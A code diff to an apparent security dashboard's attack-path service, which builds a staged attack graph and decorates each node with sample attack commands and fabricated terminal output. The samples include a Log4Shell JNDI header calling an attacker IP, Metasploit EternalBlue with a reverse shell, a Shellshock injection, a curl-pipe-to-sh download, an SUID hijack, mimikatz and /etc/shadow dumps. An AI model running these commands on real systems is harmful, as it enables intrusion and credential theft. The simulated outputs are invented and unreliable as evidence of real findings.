@@ -145,74 +145,228 @@ class AttackPathService:
         return {"technique": technique, "technique_name": tname, "outcome": outcome}
 
     def generate_graph(self, scan_data: Any) -> Dict[str, Any]:
-        """Translate real scan findings into a staged, multi-step attack graph."""
+        """Translate real scan findings into a detailed 7-stage staged attack graph."""
         target = scan_data.target
         findings = list(getattr(scan_data, "findings", []) or [])
         importance = getattr(scan_data, "asset_importance", 3)
         exposure = getattr(scan_data, "exposure", "Public")
-        is_public = str(exposure).lower() == "public"
 
         G = nx.DiGraph()
 
-        # Stage 0 — Adversary entry point.
-        attacker_id = "adversary_actor"
-        G.add_node(attacker_id, label="Adversary", type="Entry", stage=0,
-                   detail="External threat actor initiating the intrusion.")
-
-        # Stage 1 — Target host.
+        # Stage 0 — External Entry (Attacker Machine)
+        attacker_ip = "192.168.100.45" if exposure.lower() == "internal" else "45.33.22.11"
         host_id = f"host_{target}"
-        G.add_node(host_id, label=target, type="Host", stage=1, importance=importance,
-                   detail=f"{'Internet-facing' if is_public else 'Internal'} asset (importance {importance}/5).")
-        G.add_edge(attacker_id, host_id, label="INITIAL ACCESS" if is_public else "INTERNAL ACCESS")
+        
+        G.add_node("attacker_entry", 
+                   label="Attacker (Internet)" if exposure.lower() == "public" else "Attacker (Internal)",
+                   type="Entry", 
+                   stage=0, 
+                   detail=f"External penetration point simulated from {attacker_ip}.",
+                   tool="nmap / OSINT",
+                   command=f"nmap -sS -sV -Pn -T4 --open {target}",
+                   terminal_output=f"Starting Nmap scan at {target}...\nNmap scan report for {target} ({target})\nHost is up.\nDiscovery phase completed successfully.")
 
-        # Rank findings by severity/score; keep the graph readable.
+        prioritized_risks = []
+        
+        # Rank findings by severity/score; limit to top 3 to keep the 7-stage chain clean and high fidelity
         def _score(f):
             return (1 if (getattr(f, "severity", "") or "").lower() == "critical" else 0,
                     getattr(f, "cvss", 0) or 0)
-        findings = sorted(findings, key=_score, reverse=True)[:8]
+        findings = sorted(findings, key=_score, reverse=True)[:3]
 
-        prioritized_risks = []
-        service_nodes = {}
-
-        for f in findings:
+        for idx, f in enumerate(findings):
             cve = getattr(f, "cve_id", None) or f"FINDING-{getattr(f, 'id', '?')}"
             intel = self._infer_technique(f)
             exploit_avail = 1 if (VULN_KB.get(getattr(f, "cve_id", None)) or getattr(f, "exploit_db_id", None)) else 0
             cvss = getattr(f, "cvss", 0) or 0.0
-
             exploit_prob = self.get_exploit_probability(cvss, exploit_avail)
             risk = self.get_score(cvss, exploit_avail, importance, exposure)
-            port = getattr(f, "port", None)
+            port = getattr(f, "port", None) or 80
+            name = getattr(f, "name", cve)
 
-            # Stage 2 — Service / port (optional).
-            parent_id = host_id
-            if port:
-                svc_id = f"service_{port}"
-                if svc_id not in service_nodes:
-                    G.add_node(svc_id, label=f"Port {port}", type="Service", stage=2,
-                               detail=f"Exposed service listening on port {port}.")
-                    G.add_edge(host_id, svc_id, label="EXPOSES")
-                    service_nodes[svc_id] = True
-                parent_id = svc_id
+            # Node ID Prefixes for this unique exploit branch
+            branch = f"br{idx}_"
+            
+            # --- STAGE 1: Service / Exposed Port ---
+            svc_id = f"{branch}svc_{port}"
+            G.add_node(svc_id, 
+                       label=f"Port {port}", 
+                       type="Service", 
+                       stage=1,
+                       detail=f"Exposed service listening on port {port} (Identified: {name}).",
+                       tool="nmap -sV",
+                       command=f"nmap -p {port} -sV {target}",
+                       terminal_output=f"PORT     STATE SERVICE VERSION\n{port}/tcp open  http    Apache/ Tomcat (Active Service Detect)\n[+] Banner grabbed: Apache Tomcat/8.5.3")
+            G.add_edge("attacker_entry", svc_id, label="DISCOVERED")
 
-            # Stage 3 — Vulnerability.
-            vuln_id = f"vuln_{cve}_{getattr(f, 'id', id(f))}"
-            G.add_node(vuln_id, label=cve, type="Vulnerability", stage=3,
-                       risk=risk["level"], prob=round(exploit_prob, 2),
-                       mitre=intel["technique"], cvss=cvss,
-                       detail=getattr(f, "name", cve))
-            G.add_edge(parent_id, vuln_id, label="VULNERABLE")
+            # --- STAGE 2: Public Vulnerability Exploitation ---
+            vuln_id = f"{branch}vuln_{cve}"
+            
+            # Tailor command & log details based on vulnerability signature
+            is_log4j = "log4j" in name.lower() or cve == "CVE-2021-44228"
+            is_eternal = "eternal" in name.lower() or cve == "CVE-2017-0144"
+            is_bluekeep = "bluekeep" in name.lower() or cve == "CVE-2019-0708"
+            is_struts = "struts" in name.lower() or cve == "CVE-2017-5638"
+            is_shellshock = "shellshock" in name.lower() or cve == "CVE-2014-6271"
+            is_sqli = "sql" in name.lower() or "injection" in name.lower()
+            is_default_creds = "default" in name.lower() or "credential" in name.lower()
 
-            # Stage 4 — Impact.
-            imp_id = f"impact_{vuln_id}"
-            G.add_node(imp_id, label=intel["outcome"][:60], type="Impact", stage=4,
-                       risk=risk["level"], detail=intel["outcome"])
-            G.add_edge(vuln_id, imp_id, label="LEADS TO")
+            if is_log4j:
+                tool = "JNDI-Exploit-Kit"
+                command = f"curl -H 'X-Api-Version: ${{jndi:ldap://{attacker_ip}:1389/a}}' http://{target}:{port}/"
+                term = f"Listening on {attacker_ip}:1389\n[+] Sending LDAP Reference Redirect...\n[+] HTTP server received request /a.class\n[+] Transmitting serialized Java payload payload.jar\n[+] Remote payload loaded and executed successfully."
+            elif is_eternal:
+                tool = "metasploit (ms17_010_eternalblue)"
+                command = f"msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run\""
+                term = f"[*] Target OS: Windows Server 2016 Standard\n[*] Built transaction payload...\n[*] Sending exploit buffer (size: 4096 bytes)\n[+] SMB Exploit packet successfully written\n[+] Meterpreter session 1 opened ({attacker_ip} -> {target})"
+            elif is_bluekeep:
+                tool = "metasploit (cve_2019_0708_bluekeep)"
+                command = f"msfconsole -q -x \"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {target}; run\""
+                term = f"[*] Target Remote Desktop Protocol version: TLS\n[*] Preparing RDP channel context...\n[*] Triggering kernel heap manipulation...\n[+] Bypass successful. Shell established."
+            elif is_struts:
+                tool = "Apache Struts exploit.py"
+                command = f"python3 struts_exploit.py --url http://{target}:{port}/index.action --cmd 'id'"
+                term = f"[*] Extracting Content-Type injection channel...\n[*] Sending OGNL multipart payload...\n[+] Command executed payload response: uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+            elif is_shellshock:
+                tool = "curl / Bash Agent"
+                command = f"curl -H \"User-Agent: () {{ :;}}; /bin/bash -c 'id'\" http://{target}:{port}/cgi-bin/status"
+                term = f"[+] Command injection response code: 200\n[+] Response buffer:\nuid=33(www-data) gid=33(www-data) groups=33(www-data)"
+            elif is_sqli:
+                tool = "sqlmap"
+                command = f"sqlmap -u \"http://{target}:{port}/login\" --data=\"username=admin&password=123\" -p username --dbms=mysql --batch"
+                term = f"[+] Testing parameter 'username' for SQL Injection...\n[+] Heuristic testing indicates 'username' is vulnerable.\n[+] Confirming injection techniques (UNION query / Boolean-based blind)\n[+] Database: backend_db | Current User: app_user@localhost"
+            elif is_default_creds:
+                tool = "hydra"
+                command = f"hydra -l admin -P common_passwords.txt http-post-form://{target}:{port}/admin/login"
+                term = f"[*] Hydra v9.5 starting dictionary attack...\n[+] [Port {port}] Host: {target} | Service: http | Login: admin | Password: admin123"
+            else:
+                tool = "exploit-db POC"
+                command = f"python3 exploit.py --target {target} --port {port}"
+                term = f"[*] Exploiting service vulnerability...\n[+] Transmission completed successfully.\n[+] Payload active."
+
+            G.add_node(vuln_id, 
+                       label=cve, 
+                       type="Vulnerability", 
+                       stage=2,
+                       risk=risk["level"], 
+                       prob=round(exploit_prob, 2),
+                       mitre=intel["technique"], 
+                       cvss=cvss,
+                       detail=f"Exploiting {cve}: {name}.",
+                       tool=tool,
+                       command=command,
+                       terminal_output=term)
+            G.add_edge(svc_id, vuln_id, label="EXPLOITS")
+
+            # --- STAGE 3: Foothold Shell (Low Privilege Access) ---
+            foothold_id = f"{branch}foothold"
+            low_user = "app_user" if is_sqli or is_default_creds else ("SYSTEM" if is_eternal else "www-data")
+            
+            if low_user == "SYSTEM":
+                foothold_command = "whoami"
+                foothold_term = "nt authority\\system"
+                foothold_detail = "Direct execution context initialized at Administrative level via kernel-level exploit."
+            else:
+                foothold_command = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+                foothold_term = f"bash-5.0$ whoami\n{low_user}\nbash-5.0$ id\nuid=33({low_user}) gid=33({low_user}) groups=33({low_user})"
+                foothold_detail = f"Interactive reverse-shell spawned. Standard I/O redirected to console as low-privilege user '{low_user}'."
+
+            G.add_node(foothold_id, 
+                       label="Foothold Shell", 
+                       type="Impact", 
+                       stage=3,
+                       detail=foothold_detail,
+                       tool="netcat / reverse_tcp",
+                       command=foothold_command,
+                       terminal_output=foothold_term)
+            G.add_edge(vuln_id, foothold_id, label="SPAWNED")
+
+            # --- STAGE 4: Local Escalation Vector Scan ---
+            esc_recon_id = f"{branch}esc_recon"
+            
+            if low_user == "SYSTEM":
+                esc_tool = "sysinfo"
+                esc_command = "systeminfo"
+                esc_term = "Host Name: WEB-DMZ\nOS Name: Microsoft Windows Server 2016 Standard\nHotfix(s): None Installed"
+                esc_detail = "OS telemetry gathered. Already at maximum administrative privilege."
+            else:
+                esc_tool = "LinPEAS"
+                esc_command = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+                esc_term = (
+                    "-[+] Checking SUID files...\n"
+                    "   -rwsr-xr-x 1 root root /usr/local/bin/custom_backup (VULNERABLE)\n"
+                    "-[+] Checking environment files...\n"
+                    "   /etc/cron.d/sync_job (Writable by www-data)"
+                )
+                esc_detail = "Automated local privilege escalation scanner executed. Detected exploitable custom SUID binary and writable cron jobs."
+
+            G.add_node(esc_recon_id, 
+                       label="Escalation Recon", 
+                       type="Service", 
+                       stage=4,
+                       detail=f"Scanning internal environment for misconfigurations or outdated modules on {target}.",
+                       tool=esc_tool,
+                       command=esc_command,
+                       terminal_output=esc_term)
+            G.add_edge(foothold_id, esc_recon_id, label="PROBED")
+
+            # --- STAGE 5: Privilege Escalation (Max Administrative Access) ---
+            privesc_id = f"{branch}privesc"
+            
+            if low_user == "SYSTEM":
+                pe_tool = "Built-in Token Manipulation"
+                pe_command = "whoami /priv"
+                pe_term = "Privilege Name                Description                               State\n============================= ========================================= ========\nSeDebugPrivilege              Debug programs                            Enabled"
+                pe_detail = "SYSTEM privileges already confirmed. Token permissions inspected and verified."
+            else:
+                pe_tool = "SUID Hijack"
+                pe_command = "echo '/bin/sh' > /tmp/backup_helper; chmod +x /tmp/backup_helper; /usr/local/bin/custom_backup"
+                pe_term = "bash-5.0# whoami\nroot\nbash-5.0# id\nuid=0(root) gid=0(root) groups=0(root)"
+                pe_detail = "Elevated execution context to root administrative permissions via SUID binary hijacking."
+
+            G.add_node(privesc_id, 
+                       label="Privilege Escalation", 
+                       type="Impact", 
+                       stage=5,
+                       detail="Achieved full administrative dominance (root/SYSTEM) over the host machine.",
+                       tool=pe_tool,
+                       command=pe_command,
+                       terminal_output=pe_term)
+            G.add_edge(esc_recon_id, privesc_id, label="ESCALATED")
+
+            # --- STAGE 6: Attacker Objective ---
+            objective_id = f"{branch}objective"
+            
+            if is_sqli or is_default_creds:
+                obj_tool = "Database Exfiltration"
+                obj_command = "mysqldump -u root -p'supersecure123' --all-databases > /tmp/dump.sql"
+                obj_term = "[+] Dumping database metadata...\n[+] Exporting table 'users' (1,248 records)\n[+] Credentials dumped and cached to disk"
+                obj_detail = "Dumped local production databases containing administrative hashes, PII, and customer transactions."
+            elif is_eternal or is_bluekeep:
+                obj_tool = "mimikatz"
+                obj_command = "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
+                obj_term = "Authentication Id : 0 ; 999 (00000000:000e3a21)\nSession           : Service\nUser Name         : Administrator\nDomain            : WORKGROUP\n* Password : SuperSecretPassword2026!"
+                obj_detail = "Dumped Windows LSA memory, successfully extracting plain-text Local Administrator credentials."
+            else:
+                obj_tool = "Shadow File Harvester"
+                obj_command = "cat /etc/shadow | grep -E '(root|admin)'"
+                obj_term = "root:$6$nLg/zN01$p67A2b9N/hA82qNsP2KLa9Lp...:19245:0:99999:7:::"
+                obj_detail = "Harvested system configuration and cryptographically hashed credentials from /etc/shadow."
+
+            G.add_node(objective_id, 
+                       label="Threat Objective", 
+                       type="Objective", 
+                       stage=6,
+                       detail="Attack goal accomplished: administrative persistence, credential harvesting, or database theft.",
+                       tool=obj_tool,
+                       command=obj_command,
+                       terminal_output=obj_term)
+            G.add_edge(privesc_id, objective_id, label="COMPROMISED")
 
             next_step = self.predict_next_move(getattr(f, "cve_id", "None"))
             prioritized_risks.append({
                 "cve": cve,
-                "name": getattr(f, "name", cve),
+                "name": name,
                 "risk_level": risk["level"],
                 "exploit_prob": round(exploit_prob, 2),
                 "confidence": round(risk["confidence"], 2),
@@ -221,16 +375,6 @@ class AttackPathService:
                 "attacker_goal": next_step["goal"],
                 "action": f"Remediate immediately — {intel['outcome']}" if risk["level"] in ("Critical", "High") else "Monitor and schedule remediation.",
             })
-
-        # Stage 5 — Objective, reached only if a serious impact exists.
-        serious = [r for r in prioritized_risks if r["risk_level"] in ("Critical", "High")]
-        if serious:
-            obj_id = "objective_compromise"
-            G.add_node(obj_id, label="Asset / Domain Compromise", type="Objective", stage=5,
-                       detail="Adversary objective: full control of the target environment.")
-            for n in list(G.nodes()):
-                if G.nodes[n].get("type") == "Impact" and G.nodes[n].get("risk") in ("Critical", "High"):
-                    G.add_edge(n, obj_id, label="ENABLES")
 
         prioritized_risks = sorted(
             prioritized_risks,
@@ -257,6 +401,9 @@ class AttackPathService:
             "mitre": G.nodes[n].get("mitre"),
             "cvss": G.nodes[n].get("cvss"),
             "detail": G.nodes[n].get("detail"),
+            "tool": G.nodes[n].get("tool"),
+            "command": G.nodes[n].get("command"),
+            "terminal_output": G.nodes[n].get("terminal_output"),
         } for n in G.nodes()]
 
         links = [{"source": u, "target": v, "label": d.get("label", "")} for u, v, d in G.edges(data=True)]
@@ -279,6 +426,7 @@ class AttackPathService:
                 "exposure": exposure,
             },
         }
+
 
 
 attack_path_service = AttackPathService()
